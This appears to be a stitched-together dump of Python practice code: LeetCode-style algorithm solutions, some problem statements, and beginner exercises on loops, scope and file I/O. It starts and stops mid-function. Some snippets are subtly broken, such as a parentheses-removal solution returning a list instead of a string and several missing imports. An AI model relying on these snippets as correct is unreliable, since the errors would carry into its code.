        return sum(max(prices[i + 1] - prices[i], 0) for i in range(len(prices) - 1))

# On every day, we buy the share with the price as low as we can, and sell the share with price as high as we can.
# For the second transaction, we integrate the profit of first transaction into the cost of the second buy,
# then the profit of the second sell will be the total profit of two transactions.
class Solution:
    def maxProfit(self, prices: List[int]) -> int:
        buy1, buy2 = float("-inf"), float("-inf")
        sell1, sell2 = 0, 0
        for price in prices:
            buy1 = max(buy1, -price)
            sell1 = max(sell1, buy1 + price)
            buy2 = max(buy2, sell1 - price)
            sell2 = max(sell2, buy2 + price)
        return sell2

# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, x):
#         self.val = x
#         self.left = None
#         self.right = None


class Solution:
    def maxPathSum(self, root):
        """
        :type root: TreeNode
        :rtype: int
        """
        self.res = root.val
        self.dfs(root)
        return self.res

    def dfs(self, node):
        if not node:
            return 0
        left = max(0, self.dfs(node.left))
        right = max(0, self.dfs(node.right))
        self.res = max(self.res, left + right + node.val)
        return max(left, right) + node.val

class Solution:
    def tilingRectangle(self, n: int, m: int) -> int:
        self.result = n * m

        def dfs(heights, moves):
            if moves > self.result:
                return
            if all(h == n for h in heights):
                self.result = min(self.result, moves)
                return
            min_height = min(heights)
            idx = heights.index(min_height)
            right_boundary = idx + 1
            while right_boundary < m and heights[right_boundary] == min_height:
                right_boundary += 1
            for l in range(min(right_boundary - idx, n - min_height), 0, -1):
                dfs(
                    heights[:idx] + [min_height + l] * l + heights[idx + l :], moves + 1
                )

        dfs([0] * m, 0)
        return self.result

class Solution:
    def minRemoveToMakeValid(self, s: str) -> str:
        stack = []
        removal = set()
        for i in range(len(s)):
            if s[i] == "(":
                stack.append(i)
            elif s[i] == ")":
                if not stack:
                    removal.add(i)
                else:
                    stack.pop()
        removal |= set(stack)
        return [s[i] for i in range(len(s)) if i not in removal]

class Solution:
    def isPalindrome(self, s):
        """
        :type s: str
        :rtype: bool
        """
        ss = "".join(c.lower() for c in s if c.isalnum())
        return ss[::-1] == ss

import string
from typing import List


class Solution:
    def ladderLength(self, beginWord: str, endWord: str, wordList: List[str]) -> int:
        wordList = set(wordList)
        if not wordList or endWord not in wordList:
            return 0
        wordList.discard(beginWord)
        q1, q2 = {beginWord}, {endWord}
        step = 1

        while q1 and q2:
            temp = set()
            for word in q1:
                for i in range(len(word)):
                    for c in string.ascii_lowercase:
                        new_word = word[:i] + c + word[i + 1 :]
                        if new_word in q2:
                            return step + 1
                        if new_word in wordList:
                            temp.add(new_word)
            wordList -= temp
            step += 1
            q1 = temp
            if len(q1) > len(q2):
                q1, q2 = q2, q1
        return 0
````

````py
 Given an unsorted array of integers, find the length of the longest consecutive elements sequence.

 Your algorithm should run in O(n) complexity.

 Example:

 Input: [100, 4, 200, 1, 3, 2]
 Output: 4
 Explanation: The longest consecutive elements sequence is [1, 2, 3, 4]. Therefore its length is 4.```


```py


class Solution(object):
    def longestConsecutive(self, nums):
        """
        :type nums: List[int]
        :rtype: int
        """
        result = 0
        nums = set(nums)

        for num in nums:
            if num - 1 not in nums:
                curr = num
                length = 1

                while curr + 1 in nums:
                    curr += 1
                    length += 1
                result = max(result, length)
        return result
````

````py
Given an integer number n, return the difference between the product of its digits and the sum of its digits.


Example 1:

Input: n = 234
Output: 15
Explanation:
Product of digits = 2 * 3 * 4 = 24
Sum of digits = 2 + 3 + 4 = 9
Result = 24 - 9 = 15
Example 2:

Input: n = 4421
Output: 21
Explanation:
Product of digits = 4 * 4 * 2 * 1 = 32
Sum of digits = 4 + 4 + 2 + 1 = 11
Result = 32 - 11 = 21```


```py


class Solution(object):
    def subtractProductAndSum(self, n):
        """
        :type n: int
        :rtype: int
        """

        from functools import reduce
        from operator import mul

        digits = [int(x) for x in str(n)]
        return reduce(mul, digits) - sum(digits)
````

````py
There are n people whose IDs go from 0 to n - 1 and each person belongs exactly to one group. Given the array groupSizes of length n telling the group size each person belongs to, return the groups there are and the people's IDs each group includes.

You can return any solution in any order and the same applies for IDs. Also, it is guaranteed that there exists at least one solution.



Example 1:

Input: groupSizes = [3,3,3,3,3,1,3]
Output: [[5],[0,1,2],[3,4,6]]
Explanation:
Other possible solutions are [[2,1,6],[5],[0,4,3]] and [[5],[0,6,2],[4,3,1]].
Example 2:

Input: groupSizes = [2,1,3,3,3,2]
Output: [[1],[0,5],[2,3,4]]```


```py


class Solution(object):
    def groupThePeople(self, groupSizes):
        """
        :type groupSizes: List[int]
        :rtype: List[List[int]]
        """
        count = collections.defaultdict(list)
        for i, size in enumerate(groupSizes):
            count[size].append(i)
        result = []
        for s, value in count.items():
            for index in range(0, len(value), s):
                result.append(value[index : index + s])
        return result

class CombinationIterator:
    def __init__(self, characters: str, combinationLength: int):
        self.characters = characters
        self.combinationLength = combinationLength
        self.combinations = self.getCombinations()

    def next(self) -> str:
        return self.combinations.pop()

    def hasNext(self) -> bool:
        return self.combinations

    def getCombinations(self):
        result = []
        n = len(self.characters)
        total = 1 << n
        for i in range(total):
            c = bin(i)[2:].zfill(n)
            if sum([1 for i in c if i == "1"]) == self.combinationLength:
                combination = []
                for j in range(n):
                    if c[j] == "1":
                        combination.append(self.characters[j])
                result.append("".join(combination))
        return result


# Your CombinationIterator object will be instantiated and called as such:
# obj = CombinationIterator(characters, combinationLength)
# param_1 = obj.next()
# param_2 = obj.hasNext()

class Solution:
    def removeCoveredIntervals(self, intervals: List[List[int]]) -> int:
        intervals.sort(key=lambda x: (x[0], -x[1]))
        result = right = 0
        for interval in intervals:
            result += interval[1] > right
            right = max(right, interval[1])
        return result

# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, x):
#         self.val = x
#         self.left = None
#         self.right = None


class Solution:
    def sumNumbers(self, root):
        """
        :type root: TreeNode
        :rtype: int
        """
        return self.getSum(root, 0)

    def getSum(self, node, s):
        if not node:
            return 0
        if not node.left and not node.right:
            return s * 10 + node.val
        return self.getSum(node.left, s * 10 + node.val) + self.getSum(
            node.right, s * 10 + node.val
        )
````

````py
Given head which is a reference node to a singly-linked list. The value of each node in the linked list is either 0 or 1. The linked list holds the binary representation of a number.

Return the decimal value of the number in the linked list.



Example 1:


Input: head = [1,0,1]
Output: 5
Explanation: (101) in base 2 = (5) in base 10
Example 2:

Input: head = [0]
Output: 0
Example 3:

Input: head = [1]
Output: 1
Example 4:

Input: head = [1,0,0,1,0,0,1,1,1,0,0,0,0,0,0]
Output: 18880
Example 5:

Input: head = [0,0]
Output: 0```


```py

# Definition for singly-linked list.
# class ListNode(object):
#     def __init__(self, x):
#         self.val = x
#         self.next = None


class Solution(object):
    def getDecimalValue(self, head):
        """
        :type head: ListNode
        :rtype: int
        """
        result = ""
        if not head:
            return 0
        while head:
            result += str(head.val)
            head = head.next
        return int(result, 2)

class Solution:
    def sequentialDigits(self, low: int, high: int) -> List[int]:
        def generate(digit):
            n = 0
            while n < high and digit < 10:
                n = n * 10 + digit
                if low <= n <= high:
                    yield n
                digit += 1

        return sorted(num for digit in range(1, 10) for num in generate(digit))
````

````py
Given an array nums of integers, return how many of them contain an even number of digits.


Example 1:

Input: nums = [12,345,2,6,7896]
Output: 2
Explanation:
12 contains 2 digits (even number of digits).
345 contains 3 digits (odd number of digits).
2 contains 1 digit (odd number of digits).
6 contains 1 digit (odd number of digits).
7896 contains 4 digits (even number of digits).
Therefore only 12 and 7896 contain an even number of digits.
Example 2:

Input: nums = [555,901,482,1771]
Output: 1
Explanation:
Only 1771 contains an even number of digits.```


```py


class Solution(object):
    def findNumbers(self, nums):
        """
        :type nums: List[int]
        :rtype: int
        """
        return len([num for num in nums if len(str(num)) % 2 == 0])
````

````py
Given an array of integers nums and a positive integer k, find whether it's possible to divide this array into sets of k consecutive numbers
Return True if its possible otherwise return False.



Example 1:

Input: nums = [1,2,3,3,4,4,5,6], k = 4
Output: true
Explanation: Array can be divided into [1,2,3,4] and [3,4,5,6].
Example 2:

Input: nums = [3,2,1,2,3,4,3,4,5,9,10,11], k = 3
Output: true
Explanation: Array can be divided into [1,2,3] , [2,3,4] , [3,4,5] and [9,10,11].
Example 3:

Input: nums = [3,3,2,2,1,1], k = 3
Output: true
Example 4:

Input: nums = [1,2,3,4], k = 3
Output: false
Explanation: Each array should be divided in subarrays of size 3.```


```py


class Solution(object):
    def isPossibleDivide(self, nums, k):
        """
        :type nums: List[int]
        :type k: int
        :rtype: bool
        """
        from collections import Counter

        count_map = Counter(nums)
        for num in sorted(count_map.keys()):
            if count_map[num] <= 0:
                continue
            for index in range(1, k):
                count_map[num + index] -= count_map[num]
                if count_map[num + index] < 0:
                    return False
        return True

# 12 Write a Python program to display 1 to 10 numbers using while loop

a = 1

while a <= 10:
    print(a)
    a = a + 1

def sortByHeight(a):
    treePositions = [x for x in range(len(a)) if a[x] == -1]
    people = sorted([x for x in a if x != -1])
    for tree in treePositions:
        people.insert(tree, -1)
    return people

# Experiment with scopes in Python.
# Good reading: https://www.programiz.com/python-programming/global-local-nonlocal-variables

# When you use a variable in a function, it's local in scope to the function.
x = 12


def changeX():
    # tell Python to use x in the global scope
    global x
    x = 99


changeX()

# This prints 12. What do we have to modify in changeX() to get it to print 99?
print(x)


# This nested function has a similar problem.


def outer():
    y = 120

    def inner():
        # tell Python to use y from the containing scope
        nonlocal y
        y = 999

    inner()

    # This prints 120. What do we have to change in inner() to get it to print
    # 999? Google "python nested function scope".
    print(y)


outer()

import re


def reverseParentheses(s):
    while "(" in s:
        match = re.search("\([^()]*\)", s)
        match_string = match.group(0)[1 : len(match.group(0)) - 1]
        reversed_match_string = match_string[::-1]
        s = s[: match.start()] + reversed_match_string + s[match.end() :]
    return s

# Milk Bottles
# https://leetcode.com/discuss/interview-question/707939/Microsoft-or-Azure-or-Milk-Bottles

# If i can exchange 3 empty bottles for one full bottle, given that i have 18 full milk bottles
# initially, how many milk bottles can i drink?

# Generalize this for 'n' bottles


def bottles(n):
    bottles_to_drink = int((3 * n - 1) / 2)
    return bottles_to_drink


print(bottles(18))

# Processing Lists
# - any, all
# - filter
# - map
# - zip
# - custom sort

scores = [90, 86, 75, 91, 62, 99, 88, 90]
print(scores)


def isA(num):
    return num >= 90


aScores = filter(isA, scores)
print(aScores)
print(list(aScores))


def getGrade(num):
    if num >= 90:
        return "A"
    elif num < 90 and num >= 80:
        return "B"
    elif num < 80 and num >= 70:
        return "C"
    elif num < 70 and num >= 60:
        return "D"
    else:
        return "F"


grades = list(map(getGrade, scores))
print(grades)

print("ZIPPED GRADES AND SCORES")
combined = list(zip(scores, grades))
print(combined)

class Solution(object):
    def romanToInt(self, s):
        """
        :type s: str
        :rtype: int
        """
        maps = {"I": 1, "V": 5, "X": 10, "L": 50, "C": 100, "D": 500, "M": 1000}
        result = 0
        for i in range(len(s)):
            if i >= 1 and maps[s[i - 1]] < maps[s[i]]:
                result += maps[s[i]] - 2 * maps[s[i - 1]]
            else:
                result += maps[s[i]]
        return result

# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, val=0, left=None, right=None):
#         self.val = val
#         self.left = left
#         self.right = right
class Solution:
    def getAllElements(self, root1: TreeNode, root2: TreeNode) -> List[int]:
        result = []
        curr1, curr2 = root1, root2
        stack1, stack2 = [], []

        while stack1 or stack2 or curr1 or curr2:
            while curr1:
                stack1.append(curr1)
                curr1 = curr1.left

            while curr2:
                stack2.append(curr2)
                curr2 = curr2.left

            if stack1 and (not stack2 or stack1[-1].val <= stack2[-1].val):
                top = stack1.pop()
                result.append(top.val)
                curr1 = top.right
            else:
                top = stack2.pop()
                result.append(top.val)
                curr2 = top.right
        return result

# time: O(2^(n-1))
class Solution:
    def partition(self, s):
        """
        :type s: str
        :rtype: List[List[str]]
        """
        res = []
        self.dfs(res, [], s)
        return res

    def dfs(self, res, path, s):
        if not s:
            res.append(path[:])
            return
        for i in range(1, len(s) + 1):
            if s[:i] == s[i - 1 :: -1]:
                self.dfs(res, path + [s[:i]], s[i:])

# dp[i] represent the min cut for s[:i+1]
# so dp[len(s)-1] stores the result
# O(n^2)


class Solution:
    def minCut(self, s):
        """
        :type s: str
        :rtype: int
        """
        if not s or len(s) == 0:
            return 0
        n = len(s)
        dp = list(range(n))
        for mid in range(1, n):
            # odd length
            start, end = mid, mid
            while start >= 0 and end < n and s[start] == s[end]:
                newCut = 0 if start == 0 else dp[start - 1] + 1
                dp[end] = min(dp[end], newCut)
                start -= 1
                end += 1

            # even length
            start, end = mid - 1, mid
            while start >= 0 and end < n and s[start] == s[end]:
                newCut = 0 if start == 0 else dp[start - 1] + 1
                dp[end] = min(dp[end], newCut)
                start -= 1
                end += 1

        return dp[n - 1]
````

````py
# Definition for a Node.
class Node:
    def __init__(self, val = 0, neighbors = None):
        self.val = val
        self.neighbors = neighbors if neighbors is not None else []```


```py
from collections import deque


class Solution:
    def cloneGraph(self, node: "Node") -> "Node":
        if not node:
            return None
        visited = {node: Node(node.val)}
        queue = deque([node])
        while queue:
            curr = queue.popleft()
            for n in curr.neighbors:
                if n not in visited:
                    new = Node(n.val)
                    visited[n] = new
                    queue.append(n)
                visited[curr].neighbors.append(visited[n])
        return visited[node]

class Solution:
    def canCompleteCircuit(self, gas, cost):
        """
        :type gas: List[int]
        :type cost: List[int]
        :rtype: int
        """
        start, total, tank = 0, 0, 0
        for i in range(len(gas)):
            curr = gas[i] - cost[i]
            tank += curr
            total += curr
            if tank < 0:
                tank = 0
                start = i + 1
        return -1 if total < 0 else start

class Solution:
    # time: O(n)
    # space: O(n)
    # def candy(self, ratings):
    #     """
    #     :type ratings: List[int]
    #     :rtype: int
    #     """
    #     res = [1]*len(ratings)
    #     for i in range(1, len(ratings)):
    #         if ratings[i] > ratings[i-1]:
    #             res[i] = res[i-1] + 1
    #     for i in range(len(ratings)-1, 0, -1):
    #         if ratings[i-1] > ratings[i]:
    #             res[i-1] = max(res[i] + 1, res[i-1])
    #     return sum(res)

    # time: O(n)
    # space: O(1)
    def candy(self, ratings):
        up, down, res, peak = 0, 0, 1, 0
        for i in range(1, len(ratings)):
            if ratings[i] > ratings[i - 1]:
                up += 1
                down = 0
                res += up + 1
                peak = up
            elif ratings[i] == ratings[i - 1]:
                up = down = peak = 0
                res += 1
            else:
                down += 1
                up = 0
                diff = -1 if peak >= down else 0
                res += 1 + down + diff
        return res

from collections import Counter


class Solution:
    def sortString(self, s: str) -> str:
        result, counter = "", Counter(s)
        letters = string.ascii_lowercase
        while len(result) < len(s):
            for ss in [letters, letters[::-1]]:
                for c in ss:
                    if counter[c] > 0:
                        counter[c] -= 1
                        result += c
        return result

class Solution:
    def numOfMinutes(
        self, n: int, headID: int, manager: List[int], informTime: List[int]
    ) -> int:
        children = {i: [] for i in range(n)}
        for child, parent in enumerate(manager):
            if parent >= 0:
                children[parent].append(child)

        def dfs(i):
            return max([dfs(child) for child in children[i]], default=0) + informTime[i]

        return dfs(headID)
````

````py
# Definition for a Node.
class Node:
    def __init__(self, x: int, next: 'Node' = None, random: 'Node' = None):
        self.val = int(x)
        self.next = next
        self.random = random```


```py
from collections import defaultdict


class Solution:
    def copyRandomList(self, head: "Node") -> "Node":
        d = defaultdict(lambda: Node(0, None, None))
        d[None] = None
        curr = head
        while curr:
            d[curr].val = curr.val
            d[curr].next = d[curr.next]
            d[curr].random = d[curr.random]
            curr = curr.next
        return d[head]

class Solution:
    def wordBreak(self, s: str, wordDict: List[str]) -> bool:
        wordDict = set(wordDict)
        return self.dfs(s, wordDict, {})

    def dfs(self, s, wordDict, cache):
        if s in cache:
            return cache[s]
        if s in wordDict:
            return True
        for i in range(1, len(s)):
            if s[:i] in wordDict and self.dfs(s[i:], wordDict, cache):
                cache[s] = True
                return True

        cache[s] = False
        return False


class Solution:
    def wordBreak(self, s: str, wordDict: List[str]) -> bool:
        wordDict = set(wordDict)
        dp = [False] * (len(s) + 1)
        dp[0] = True

        for j in range(1, len(s) + 1):
            for i in range(j):
                word = s[i:j]
                if word in wordDict and dp[i]:
                    dp[j] = True
                    break
        return dp[len(s)]

# 13. Write a Python Program to display Fibonacci Series upto given number.

# asking user input
number = int(input("Enter the number: "))

# declaring initial values
f1 = 0
f2 = 1

# initializing count
count = 0

# applying condition for fibonacci
if number <= 0:
    print("Enter a valid +ve number: ")
elif number == 1:
    print("FIbonacci series for 1 number is: ", number)
else:
    print("The fibonacci series for the number entered is: ")
    while count < number:
        print(f1, end=" , ")
        fth = f1 + f2

        # now update the values
        f1 = f2
        f2 = fth
        count += 1

import re


def reverseParentheses(s):
    while "(" in s:
        match = re.search("\([^()]*\)", s)
        match_string = match.group(0)[1 : len(match.group(0)) - 1]
        reversed_match_string = match_string[::-1]
        s = s[: match.start()] + reversed_match_string + s[match.end() :]
    return s

# %%```


```py
Python makes performing file I/O simple. Take a look
at how to read and write to files here:

https://docs.python.org/3/tutorial/inputoutput.html#reading-and-writing-files```


```py

# %% [markdown]
# Open up the "foo.txt" file (which already exists) for reading
# Print all the contents of the file, then close the file

# %%
with open("foo.txt") as fp:
    for line in fp:
        print(line)


# %% [markdown]
# Open up a file called "bar.txt" (which doesn't exist yet) for
# writing. Write three lines of arbitrary content to that file,
# then close the file. Open up "bar.txt" and inspect it to make
# sure that it contains what you expect it to contain

# %%
fp = open("bar.txt", "w")

# %%
fp.write(
    """Line 1
            Line 2
            Line 3"""
)

from random import choice


def random_name_generator(first, second, x):
    """
        Generates random names.
        Arguments:
         - list of first names
         - list of last names
         - number of random names
    """
    names = []
    for i in range(x):
        names.append("{0} {1}".format(choice(first), choice(second)))
    return set(names)


first_names = ["Drew", "Mike", "Landon", "Jeremy", "Tyler", "Tom", "Avery"]
last_names = ["Smith", "Jones", "Brighton", "Taylor"]
names = random_name_generator(first_names, last_names, 5)
print("\n".join(names))

# Processing Lists
# - any, all
# - filter
# - map
# - zip
# - custom sort

users = [
    {"id": 12323, "displayName": "Joe Smith", "email": "joe.smith@here.com"},
    {"id": 22312, "displayName": "Bob Smith", "email": "bob.smith@here.com"},
    {"id": 37373, "displayName": "angel chen", "email": "angel.chen@here.com"},
]
print(users)


def sorter(user):
    return user["displayName"].lower()


users.sort(key=sorter)
print(users)

reverseUsers = sorted(users, key=sorter, reverse=True)
print(reverseUsers)

class Solution(object):
    def longestCommonPrefix(self, strs):
        """
        :type strs: List[str]
        :rtype: str
        """
        if not strs:
            return ""
        end_index = 0
        for group in zip(*strs):
            if len(set(group)) > 1:
                return strs[0][:end_index]
            end_index += 1
        return strs[0][:end_index]

# Time: O(N^3)


class Solution:
    def wordBreak(self, s: str, wordDict: List[str]) -> List[str]:
        return self.dfs(s, set(wordDict), dict())

    def dfs(self, s, wordDict, cache):
        if s in cache:
            return cache[s]
        if len(s) == 0:
            return [""]
        result = []
        for i in range(1, len(s) + 1):
            word = s[:i]
            if word in wordDict:
                temp = self.dfs(s[i:], wordDict, cache)
                for ss in temp:
                    if not ss:
                        result.append(word)
                    else:
                        result.append(word + " " + ss)
        cache[s] = result
        return result
````

````py
 Given a linked list, determine if it has a cycle in it.

 Follow up:
 Can you solve it without using extra space?```


```py

# Definition for singly-linked list.
# class ListNode(object):
#     def __init__(self, x):
#         self.val = x
#         self.next = None


class Solution(object):
    def hasCycle(self, head):
        """
        :type head: ListNode
        :rtype: bool
        """

        if not head:
            return False

        slow, fast = head, head
        while fast and fast.next:
            slow = slow.next
            fast = fast.next.next
            if slow == fast:
                return True
        return False
````

````py
 Given a linked list, return the node where the cycle begins. If there is no cycle, return null.

 Note: Do not modify the linked list.

 Follow up:
 Can you solve it without using extra space?```


```py
# Definition for singly-linked list.
# class ListNode(object):
#     def __init__(self, x):
#         self.val = x
#         self.next = None


class Solution(object):
    def detectCycle(self, head):
        """
        :type head: ListNode
        :rtype: ListNode
        """
        if not head:
            return None

        slow, fast = head, head.next

        while fast and fast.next:
            slow = slow.next
            fast = fast.next.next
            if slow == fast:
                break

        if slow == fast:
            slow = head
            while slow != fast:
                slow = slow.next
                fast = fast.next
            return slow
        return None

# """
# This is BinaryMatrix's API interface.
# You should not implement it, or speculate about its implementation
# """
# class BinaryMatrix(object):
#    def get(self, row: int, col: int) -> int:
#    def dimensions(self) -> list[]:


class Solution:
    def leftMostColumnWithOne(self, binaryMatrix: "BinaryMatrix") -> int:
        m, n = binaryMatrix.dimensions()
        result = n
        for i in range(m):
            left, right = 0, result
            while left < right:
                mid = left + (right - left) // 2
                if binaryMatrix.get(i, mid) == 1:
                    right = mid
                else:
                    left = mid + 1
            result = left
        return result if result != n else -1

# Definition for singly-linked list.
# class ListNode:
#     def __init__(self, val=0, next=None):
#         self.val = val
#         self.next = next
class Solution:
    def reorderList(self, head: ListNode) -> None:
        """
        Do not return anything, modify head in-place instead.
        """
        if not head:
            return
        slow = fast = head
        while fast and fast.next:
            slow = slow.next
            fast = fast.next.next

        prev, node = None, slow
        while node:
            prev, node.next, node = node, prev, node.next

        first, second = head, prev
        while second.next:
            first.next, first = second, first.next
            second.next, second = first, second.next

# Definition for a binary tree node.
class TreeNode:
    def __init__(self, x):
        self.val = x
        self.left = None
        self.right = None


class Solution:
    def preorderTraversal(self, root):
        """
        :type root: TreeNode
        :rtype: List[int]
        """
        if root:
            return (
                [root.val]
                + self.preorderTraversal(root.left)
                + self.preorderTraversal(root.right)
            )
        return []

        # iterative
        # result = []
        # stack = [root]
        # while stack:
        #     curr = stack.pop()
        #     if curr:
        #         result.append(curr.val)
        #         stack.append(curr.right)
        #         stack.append(curr.left)
        # return result

# Definition for a binary tree node.
class TreeNode:
    def __init__(self, x):
        self.val = x
        self.left = None
        self.right = None


class Solution:
    def postorderTraversal(self, root):
        """
        :type root: TreeNode
        :rtype: List[int]
        """
        if root:
            return (
                self.postorderTraversal(root.left)
                + self.postorderTraversal(root.right)
                + [root.val]
            )
        return []

# Definition for singly-linked list.
# class ListNode(object):
#     def __init__(self, x):
#         self.val = x
#         self.next = None


class Solution(object):
    def insertionSortList(self, head):
        """
        :type head: ListNode
        :rtype: ListNode
        """

        if not head:
            return None

        sortedList = head
        head = head.next
        sortedList.next = None

        while head:
            curr = head
            head = head.next
            if curr.val <= sortedList.val:
                curr.next = sortedList
                sortedList = curr
            else:
                temp = sortedList
                while temp.next and temp.next.val < curr.val:
                    temp = temp.next
                curr.next = temp.next
                temp.next = curr
        return sortedList

import math


class Solution:
    def maxPoints(self, points: List[List[int]]) -> int:
        n = len(points)
        if n <= 2:
            return n
        result = 0
        for i in range(n):
            curmax = 0
            overlap = 0
            d = dict()
            for j in range(i + 1, n):
                dy, dx = points[j][1] - points[i][1], points[j][0] - points[i][0]
                if dx == 0 and dy == 0:
                    overlap += 1
                    continue
                gcd = math.gcd(dx, dy)
                dx /= gcd
                dy /= gcd
                if dy < 0 and (dx < 0 or dx > 0):
                    dy *= -1
                    dx *= -1
                if dy == 0:
                    dx = 1
                if dx == 0:
                    dy = 1
                d[(dx, dy)] = d.get((dx, dy), 0) + 1
                curmax = max(curmax, d[(dx, dy)])
            result = max(result, curmax + overlap + 1)
        return result

# 14. Write a Python Program to print even numbers between 1 to 10

i = 1
while i <= 10:
    if i % 2 == 0:
        print(i)
    i = i + 1

def addBorder(picture):
    picture = ["*" + string + "*" for string in picture]
    picture = [("*" * len(picture[0]))] + picture + [("*" * len(picture[0]))]
    return picture

class Solution(object):
    def threeSum(self, nums):
        """
        :type nums: List[int]
        :rtype: List[List[int]]
        """
        nums.sort()
        result = []
        for i in range(len(nums) - 2):
            if i > 0 and nums[i] == nums[i - 1]:
                continue
            left, right = i + 1, len(nums) - 1
            while left < right:
                if nums[i] + nums[left] + nums[right] == 0:
                    result.append([nums[i], nums[left], nums[right]])
                    while left < right and nums[left] == nums[left + 1]:
                        left += 1
                    while left < right and nums[right] == nums[right - 1]:
                        right -= 1
                    left += 1
                    right -= 1
                elif nums[i] + nums[left] + nums[right] > 0:
                    right -= 1
                else:
                    left += 1
        return result

class Solution:
    def evalRPN(self, tokens: List[str]) -> int:
        stack = []
        for token in tokens:
            if token not in {"+", "-", "*", "/"}:
                stack.append(int(token))
            else:
                r, l = stack.pop(), stack.pop()
                if token == "+":
                    stack.append(l + r)
                elif token == "-":
                    stack.append(l - r)
                elif token == "*":
                    stack.append(l * r)
                elif token == "/":
                    stack.append(int(l / r))
        return stack[-1]

class Solution(object):
    def reverseWords(self, s):
        """
        :type s: str
        :rtype: str
        """
        ss = " ".join(s.split()[::-1])
        return ss

class Solution:
    def maxProduct(self, nums):
        """
        :type nums: List[int]
        :rtype: int
        """
        if not nums:
            return 0
        result = big = small = nums[0]
        for num in nums[1:]:
            big, small = (
                max(num, big * num, small * num),
                min(num, big * num, small * num),
            )
            result = max(result, big)
        return result

class Solution:
    def findMin(self, nums):
        """
        :type nums: List[int]
        :rtype: int
        """
        if not nums:
            return -1
        l, r = 0, len(nums) - 1
        while l < r:
            m = l + (r - l) // 2
            if nums[r] < nums[m]:
                l = m + 1
            else:
                r = m
        return nums[l]

class Solution:
    def findMin(self, nums):
        """
        :type nums: List[int]
        :rtype: int
        """
        if not nums:
            return -1
        l, r = 0, len(nums) - 1
        while l < r:
            m = l + (r - l) // 2
            if nums[r] < nums[m]:
                l = m + 1
            elif nums[r] > nums[m]:
                r = m
            else:
                r -= 1
        return nums[l]

class MinStack:
    def __init__(self):
        """
        initialize your data structure here.
        """
        self.stack = []

    def push(self, x):
        """
        :type x: int
        :rtype: void
        """
        if not self.stack:
            self.stack.append([x, x])
        else:
            self.stack.append([x, min(x, self.stack[-1][1])])

    def pop(self):
        """
        :rtype: void
        """
        self.stack.pop()

    def top(self):
        """
        :rtype: int
        """
        return self.stack[-1][0]

    def getMin(self):
        """
        :rtype: int
        """
        return self.stack[-1][1]

class Solution:
    def findSmallestSetOfVertices(self, n: int, edges: List[List[int]]) -> List[int]:
        values = [0] * n
        for edge in edges:
            values[edge[1]] += 1
        return [x for x in range(n) if values[x] == 0]
````

````py
The read4 API is already defined for you.

    @param buf4, a list of characters
    @return an integer
    def read4(buf4):

# Below is an example of how the read4 API can be called.
file = File("abcdefghijk") # File is "abcdefghijk", initially file pointer (fp) points to 'a'
buf4 = [' '] * 4 # Create buffer with enough space to store characters
read4(buf4) # read4 returns 4. Now buf = ['a','b','c','d'], fp points to 'e'
read4(buf4) # read4 returns 4. Now buf = ['e','f','g','h'], fp points to 'i'
read4(buf4) # read4 returns 3. Now buf = ['i','j','k',...], fp points to end of file```


```py


class Solution:
    def read(self, buf, n):
        """
        :type buf: Destination buffer (List[str])
        :type n: Number of characters to read (int)
        :rtype: The number of actual characters read (int)
        """
        i = 0
        while i < n:
            buf4 = [" "] * 4
            count = read4(buf4)
            if not count:
                break
            count = min(count, n - i)
            buf[i:] = buf4[:count]
            i += count
        return i

# The read4 API is already defined for you.
# def read4(buf4: List[str]) -> int:
from collections import deque


class Solution:
    def __init__(self):
        self.q = deque()

    def read(self, buf: List[str], n: int) -> int:
        i = 0
        while i < n:
            while self.q and i < n:
                buf[i] = self.q.popleft()
                i += 1
            else:
                buf4 = [" "] * 4
                count = read4(buf4)
                if not count:
                    break
                self.q += buf4[:count]
        return i

# Time: O(n)
# Space: O(1)
class Solution:
    def lengthOfLongestSubstringTwoDistinct(self, s: str) -> int:
        d = {}
        count = 0
        start, end = 0, 0
        result = 0
        while end < len(s):
            c = s[end]
            d[c] = d.get(c, 0) + 1
            if d[c] == 1:
                count += 1
            end += 1
            while count > 2 and start < len(s):
                curr = s[start]
                if curr in d:
                    d[curr] -= 1
                    if d[curr] == 0:
                        count -= 1
                start += 1
            result = max(result, end - start)
        return result

class Solution:
    def maxUniqueSplit(self, s: str) -> int:
        result = []

        def dfs(path, word):
            if not word:
                result.append(path)
                return
            for i in range(1, len(word) + 1):
                prefix, suffix = word[:i], word[i:]
                if prefix not in path:
                    dfs(path | {prefix}, suffix)

        dfs(set(), s)
        l = 1
        for item in result:
            l = max(len(item), l)
        return l

# 15. Print a Python Program to print Odd Numbers between 1 to 10

i = 1
while i <= 10:
    if i % 2 != 0:
        print(i)
    i = i + 1

def addBorder(picture):
    picture = ["*" + string + "*" for string in picture]
    picture = [("*" * len(picture[0]))] + picture + [("*" * len(picture[0]))]
    return picture
````

```py
Pass in a config file based on your environment.

Example:

import check_my_environment


class Main:
    def __init__(self, configFile):
        pass

    def process(self):
        print("ok")

if __name__ == "__main__":
    m = Main(some_script.CONFIGFILE)
    m.process()
```

```py


import os
import sys

ENVIRONMENT = "development"
CONFIGFILE = None


def get_config_file():
    directory = os.path.dirname(__file__)
    return {
        "development": "{}/../config/development.cfg".format(directory),
        "staging": "{}/../config/staging.cfg".format(directory),
        "production": "{}/../config/production.cfg".format(directory),
    }.get(ENVIRONMENT, None)


CONFIGFILE = get_config_file()

if CONFIGFILE is None:
    sys.exit(
        "Configuration error! Unknown environment set. \
              Edit config.py and set appropriate environment"
    )
print("Config file: {}".format(CONFIGFILE))
if not os.path.exists(CONFIGFILE):
    sys.exit("Configuration error! Config file does not exist")
print("Config ok ....")

# Input Validation
# - prompt
# - handle empty string
# - make it a number
# - handle exceptions
# - require valid input

age = 1
while age:
    age = input("What's your age? ")
    if age:
        try:
            age = int(float(age))
            print(f"Cool! You had {age} birthdays.")
        except:
            print("Please enter a number")

# Input Validation
# - prompt
# - handle empty string
# - make it a number
# - handle exceptions
# - require valid input

print("Welcome to birthday calculator. Enter 0 to end.")
age = 1
while age:
    age = input("What's your age? ")
    if age:
        try:
            age = int(float(age))
            if age > 0 and age < 120:
                print(f"Cool! You had {age} birthdays.")
            else:
                print("Out of range. Please try again.")
        except:
            print("Please enter a number")

def areSimilar(a, b):
    diff = [i for i in range(len(a)) if a[i] != b[i]]
    if len(diff) == 2:
        b[diff[0]], b[diff[1]] = b[diff[1]], b[diff[0]]
    return a == b

class Solution:
    def threeSumClosest(self, nums: List[int], target: int) -> int:
        nums.sort()
        result = float("inf")
        for i in range(len(nums) - 2):
